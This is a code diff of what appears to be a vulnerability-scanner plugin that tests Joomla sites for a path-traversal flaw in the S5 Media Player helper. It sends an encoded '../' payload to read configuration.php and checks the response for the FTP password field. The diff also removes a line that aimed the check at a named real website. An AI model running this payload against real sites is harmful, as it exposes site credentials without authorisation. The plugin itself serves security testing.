@@ -10,10 +10,11 @@ def assign(service, arg):
 def audit(arg):
     payload = 'plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
     target = arg + payload
-    
-    code, head, res, errcode, _ = curl.curl2(target);
+
+    code, head, res, errcode, _ = curl.curl2(target)
     if code == 200 and "public $ftp_pass" in res and "class JConfig {" in res:
         security_hole(target)
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('joomla', 'http://www.goodcounsel.org/')[1])
